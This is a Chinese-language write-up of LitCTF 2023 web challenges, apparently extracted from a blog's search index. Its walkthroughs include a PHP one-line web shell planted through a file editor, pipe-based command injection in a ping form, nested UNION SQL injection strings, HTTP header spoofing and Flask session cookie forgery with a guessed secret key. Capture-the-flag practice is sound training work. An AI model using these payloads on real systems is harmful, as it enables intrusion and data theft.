#\r进去之后页面是这样\n先看看网页源码呢\n在注释里拿到flag\n源码里也有一段彩蛋\n导弹迷踪 #\r进去之后好像是一个小游戏\n先审查一下源码\n在最下面看到Game files\n查看一下game.js\n发现flag\nFollow me and hack me #\r没啥难度\n直接上hackbar就行\n似乎备份文件里有什么东西，去看看\n试试常用的备份文件\n发现有/www.zip，在index.php.bak里发现一个彩蛋\nVim yyds #\r只知道VIM是个编辑器，然后去查了一下信息\nvim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php.swp文件，我们可以使用vim -r .index.php.swp恢复文件\n\u0026lt;?php\rerror_reporting(0);\r$password = \u0026#34;Give_Me_Your_Flag\u0026#34;;\recho \u0026#34;\u0026lt;p\u0026gt;can can need Vim \u0026lt;/p\u0026gt;\u0026#34;;\rif ($_POST[\u0026#39;password\u0026#39;] === base64_encode($password)) {\recho \u0026#34;\u0026lt;p\u0026gt;Oh You got my password!\u0026lt;/p\u0026gt;\u0026#34;;\reval(system($_POST[\u0026#39;cmd\u0026#39;]));\r}\r?\u0026gt; POST一个base64加密后的password，再POST一个cmd执行命令就行\nPHP是世界上最好的语言！！ #\r进去之后好像是一个转化工具\n猜测有可能是命令执行，在右边随便试试，\nrun一下system(\u0026ldquo;ls /\u0026rdquo;);目录就爆出来了\n然后直接cat flag就行\n这道题似乎没有过滤什么东西\n作业管理系统 #\r进去就是一个登录，试试用admin，admin登录，进去之后如下\n下面有个创建文件，随便创建一个1.php，然后编辑一下\n\u0026lt;?php @eval($_POST[\u0026#39;hyh\u0026#39;]);?\u0026gt; 然后蚁剑连起来\n在根目录下拿到flag\nPing #\r简单的前端绕过，把check_ip删了就行\n然后直接进行命令执行就就行\n127.0.0.1|ls / =\u0026gt; 127.0.0.1|cat /flag 拿到flag\n这是什么？SQL ！注一下 ！ #\r提示如下，居然套这么多层。。。。\n先进行常规注入，再password里发现一段彩蛋\n好像flag就不在这个数据库里面\n那就重新来过\n爆一下库名：\n-1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata--+ 还有一个ctftraining库，flag应该是在这个库里面\n里面也有一张flag表，这个时候要拿到flag字段的时候就要指明数据库了，不然他只会查默认那个库\n拿到flag：\n-1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag--+ Http pro max plus #\r这道题考的是和HTTP相关的\n直接上burpsuite\n试试X-Forwarded-For头，结果被发现了！\n然后再试试Client-Ip：127.0.0.1\n来到下一关\n作者为什么要选这个网站。。。。\n看见from就想到referer了，添加一个referer头绕过\n来到下一关\nuser-agent：Chrome\n下一关\n哦？这是新东西，没见过，到处查资料，幸好有万能的GPT\n添加一个Via 头\n出现一个php，进去看看\n发现源码\n在另一个php中得到flag\n就当无事发生 #\r在GitHub源码里，拿到flag\n1zjs #\r一个魔方游戏，我不会玩魔方。。\n万事先看看源码\n在一个js文件里发现flag.php\n进去看看，全是括号\n不过这道题叫js，应该是与js有关，但是看着好像又不是js代码， 查询资料后发现是 jsfuck类型的代码\n直接去解码或者在控制台跑一下就行了\nFlag点击就送！ #\r随便输入一个名字，发现响应头里有session\n把这段session拿去jwt.io解密一下\n那么就要伪造session了\n在伪造session之前要知道key值\nflask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret_key，也就是密钥对数据进行签名来防止session被纂改。\n使用脚本加密一下\npython flask_session_cookie_manager3.py encode -s \u0026#39;LitCTF\u0026#39; -t \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; 再抓包修改，即可伪造为admin管理员登录，拿到flag\n","date":"2023-06-17","externalUrl":null,"permalink":"/posts/2023/06/litctf-2023/","section":"Posts","summary":"","title":"LitCTF-2023","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]